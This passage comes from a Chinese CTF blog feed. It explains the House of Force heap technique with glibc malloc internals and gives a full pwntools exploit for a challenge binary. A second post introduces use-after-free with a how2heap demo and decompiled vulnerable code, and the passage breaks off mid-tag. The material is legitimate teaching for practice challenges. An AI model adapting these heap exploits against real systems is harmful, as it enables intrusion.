internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-comment">/*  Same, except also perform argument check */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz)                                          \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="hljs-meta">        __set_errno(ENOMEM);                                                   \</span><br><span class="hljs-meta">        return 0;                                                              \</span><br><span class="hljs-meta">    &#125;                                                                          \</span><br><span class="hljs-meta">    (sz) = request2size(req);</span><br></code></pre></td></tr></table></figure><p>一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。</p><ul><li>MALLOC_ALIGN_MASK : 是用于对齐的掩码。<ul><li>32位 ：0x07 </li><li>64位 ：0x0F</li></ul></li><li>MALLOC_ALIGNMENT ：是对齐的大小<ul><li>32位 ：8字节</li><li>64位 ：16字节</li></ul></li></ul><p>另一方面，在满足对应的约束后，我们需要使得 <code>request2size</code>正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 恰好为 - 4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其分别减去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而<strong>如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK == <span class="hljs-number">-4112</span><br></code></pre></td></tr></table></figure><ul><li>对于对齐情况<ul><li>req &#x3D; - 距离 - SIZE_SZ</li></ul></li><li>对于没有对齐情况<ul><li>req &#x3D; - 距离 - SIZE_SZ - MALLOC_ALIGN_MASK</li></ul></li></ul><p>因此，我们当调用<code>malloc(-4120)</code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1b20</span> &lt;main_arena&gt;:\   <span class="hljs-number">0</span>x0000000100000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000601010 &lt;=== 可以观察到top chunk被抬高<br><span class="hljs-attribute">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd1b78<br></code></pre></td></tr></table></figure><p>之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p><p>但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">set_head(<span class="hljs-name">victim</span>, nb | PREV_INUSE |<br>        (<span class="hljs-name">av</span> != <span class="hljs-symbol">&amp;main_arena</span> ? NON_MAIN_ARENA : <span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>例题下载 ：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn143_1604">例题</a></p><p>非常经典的菜单</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011728057.png"></p><p>直接看关键点</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011730321.png" alt="edit函数"></p><p>edit函数存在堆溢出，我们可以通过这个漏洞来控制Top chunk的size字段</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011733131.png"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011735542.png" alt="main函数"></p><p>输入5执行gondbye_meessage函数</p><p>利用思路：</p><ol><li>通过houseofforce，将topchunk的地址移到记录goodbye_messaged的chunk0处 </li><li>再次申请chunk，我们就能分配到chunk0</li><li>将goodbye_message改为后⻔函数的地址 </li><li>输⼊5调⽤v4[1],即可获得flag</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn143_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28117&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * 0x000000000400AEB</span><br><span class="hljs-string">            b * 0x000000000400C65</span><br><span class="hljs-string">            b * 0x000000000400D7D</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the length:&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the name:&#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the index:&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the length of name:&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the new name:&#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the index:&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  <br><br>flag = <span class="hljs-number">0x0000000000400D7F</span><br>add(<span class="hljs-number">0x30</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-number">0x41</span> , payload)<br>offset = -<span class="hljs-number">0x68</span><br>add(offset , <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span> , p64(flag) * <span class="hljs-number">2</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>每一步堆的变换</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011740856.png" alt="修改Top chunk的size字段"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011741988.png" alt="改变Top chunk的地址"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011741669.png" alt="控制goodbye_messaged"></p>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House-of-Force</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAF漏洞</title>
    <link href="/2024/08/01/UAF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/08/01/UAF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是UAF"><a href="#什么是UAF" class="headerlink" title="什么是UAF"></a>什么是UAF</h2><p>UAF就是Use After Free，简单来说就是释放后再次被使用，分为一下几种情况：</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong></li></ul><p>目前我刚入门只碰见第一种，看别人的博客说后两种比较常见。**我们一般称释放后没有被设置为NULL的内存指针为dangling pointer(悬垂指针)**。</p><p>这里在how2heap上有个实验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file doesn&#x27;t demonstrate an attack, but shows the nature of glibc&#x27;s allocator.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This can be exploited in a use-after-free situation.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);<br><span class="hljs-type">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>);<br><span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x256</span>);<br><span class="hljs-type">char</span>* c;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;we could continue mallocing here...\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);<br><span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;this is A!&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);<br>c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);<br><span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;this is C!&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以编译一下做一下这个实验</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>做一个最简单的UAF漏洞的题，初学堆做出来再简单的题都会很有成就感😃。</p><p>下载地址:<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn141_1804">例题</a></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011605301.png"></p><p>一个经典菜单，打开各个功能看一下</p><p>Add note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( count &lt;= <span class="hljs-number">5</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )<br>      &#123;<br>        *((_DWORD *)&amp;notelist + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);<br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        **((_DWORD **)&amp;notelist + i) = print_note_content;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = *((_DWORD *)&amp;notelist + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size);<br>        <span class="hljs-keyword">if</span> ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + <span class="hljs-number">4</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *(<span class="hljs-type">void</span> **)(*((_DWORD *)&amp;notelist + i) + <span class="hljs-number">4</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++count;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>申请堆块的时候先申请一个0x8大小的堆块管理，第一个字储存了print函数的地址，第二个字储存堆的内容地址，这个堆块的地址存在notelist中。下面就申请了储存内容的堆。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011615307.png" alt="申请堆结构"></p><p>Delete note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(*((_DWORD *)&amp;notelist + v1) + <span class="hljs-number">4</span>));<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;notelist + v1));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里存在UAF漏洞free掉堆块，但是没有把指针赋值为NULL</p><p>Print note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">print_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )<br>    (**((<span class="hljs-type">void</span> (__cdecl ***)(_DWORD))&amp;notelist + v1))(*((_DWORD *)&amp;notelist + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用控制堆块的打印函数，传入参数为内容堆块的地址</p><p>存在后门函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011619614.png" 